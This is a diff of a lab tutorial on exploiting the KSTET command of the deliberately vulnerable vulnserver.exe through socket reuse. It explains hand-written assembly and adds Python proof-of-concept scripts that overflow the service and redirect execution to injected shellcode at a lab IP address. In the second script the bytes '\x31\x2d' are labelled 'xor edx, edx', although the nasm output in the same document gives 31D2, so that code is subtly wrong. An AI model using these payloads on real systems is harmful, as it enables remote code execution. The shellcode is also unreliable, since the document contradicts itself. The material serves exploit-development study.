@@ -159,7 +159,7 @@ The first instruction of:
 xor ecx, ecx
 ```
 
-is to 'zero' out the ECX register, for our calculations. Remember, XOR'ing any value with itself, will result in a zero value.
+We are using this instruction to 'zero' out the ECX register, for our calculations. Remember, XOR'ing any value with itself, will result in a zero value.
 
 The second instruction:
 
@@ -167,7 +167,7 @@ The second instruction:
 add cl, 0x88
 ```
 
-will add `0x88` bytes to the CL register. The CL register (counter low), is an 8 bit register (with CH, or counter high)that makes up the 16 bit register CX. CX is a 16 bit register that makes up the 32 bit register (x86) ECX. 
+This adds `0x88` bytes to the CL register. The CL register (counter low), is an 8 bit register (with CH, or counter high)that makes up the 16 bit register CX. CX is a 16 bit register that makes up the 32 bit register (x86) ECX. 
 
 Here is a diagram that outlines this better:
 
@@ -193,7 +193,7 @@ The third instruction:
 ```console
 push ecx
 ```
-is to get the value onto the top of the stack. In other words, the value of `0x00000088` is being stored in ESP- as ESP contains the value of the item on top of the stack.
+This gets the value onto the top of the stack. In other words, the value of `0x00000088` is being stored in ESP- as ESP contains the value of the item on top of the stack.
 
 The last instruction:
 
@@ -201,10 +201,115 @@ The last instruction:
 mov edi, esp
 ```
 
-is in order move the contents of ESP, into EDI. The reason we do this, is because this will create a memory address (ESP's address, which contains a pointer to the value `0x00000088`). EDI now is a memory address that points to the value of the file descriptor. 
+This will move the contents of ESP, into EDI. The reason we do this, is because this will create a memory address (ESP's address, which contains a pointer to the value `0x00000088`). EDI now is a memory address that points to the value of the file descriptor. 
 
-Although we did not find the ACTUAL file desciptor the OS generated, we are essentially "tricking" the OS into thinking this is the file description. The OS is only looking for a pointer that references teh value `0x00000088`, not a specific memory address.
+Although we did not find the ACTUAL file desciptor the OS generated, we are essentially "tricking" the OS into thinking this is the file description. The OS is only looking for a pointer that references the value `0x00000088`, not a specific memory address.
+
+Before executing the POC, make sure to add a couple of software breakpoints (\xCC) BEFORE the shellcode! This is to pause execution, to allow for accurate calculations.
+
+Here is the updated POC (also, remember to remove the breakpoint set earlier on the call to WS_32.recv()):
+
+```python
+import os
+import sys
+import socket
+
+# Vulnerable command
+command = "KSTET "
+
+# 2000 bytes to crash vulnserver.exe
+# Software breakpoint to pause execution
+crash = "\xCC" * 2
+
+# Creating File Descriptor
+crash += "\x31\xc9"			# xor ecx, ecx
+crash += "\x80\xc1\x88"			# add cl, 0x88
+crash += "\x51"				# push ecx
+crash += "\x89\xe7"			# mov edi, esp
+
+# 70 byte offset to EIP
+crash += "\x41" * (70-len(crash))
+crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\x43" * (2000-len(crash))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.143", 9999))
+
+s.send(command+crash)
+```
+
+Also take note, our shellcode is located in the EAX register, from the `jmp eax` instruction previously. EAX was also used as the padding buffer to reach EIP. This is why our shellcode is located before the `jmp eax` instruction. If this was a simple `jmp esp` exploit, all of these calculations and instructions would be located directly after the memory address used for the EIP overwrite.
+
+Execution in Immunity:
+
+```console
+xor ecx, ecx
+```
+
+
+
 
 Flags
 ---
 Now that the file descriptor is out of the way- we will start with the last parameter, the flags. 
+
+The flags are the most painless of the flags. All that is needed is a value of `0x00000000` on the stack. Here is the shellcode for this:
+
+```console
+nasm > xor edx, edx
+00000000  31D2              xor edx,edx
+nasm > push edx
+00000000  52                push edx
+```
+
+The first instruction:
+
+```console
+xor edx, edx
+```
+
+This will once again "zero out" the EDX register.
+
+The second instruction:
+
+```console
+push edx
+```
+
+Here, we are pushing EDX onto the top of the stack.
+
+Updated POC:
+
+```python
+import os
+import sys
+import socket
+
+# Vulnerable command
+command = "KSTET "
+
+# 2000 bytes to crash vulnserver.exe
+# Software breakpoint to pause execution
+crash = "\xCC" * 2
+
+# Creating File Descriptor
+crash += "\x31\xc9"			# xor ecx, ecx
+crash += "\x80\xc1\x88"			# add cl, 0x88
+crash += "\x51"				# push ecx
+crash += "\x89\xe7"			# mov edi, esp
+
+
+# Flags
+crash += "\x31\x2d"			# xor edx, edx
+crash += "\x52"				# push edx
+
+# 70 byte offset to EIP
+crash += "\x41" * (70-len(crash))
+crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\x43" * (2000-len(crash))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.143", 9999))
+
+s.send(command+crash)
+```
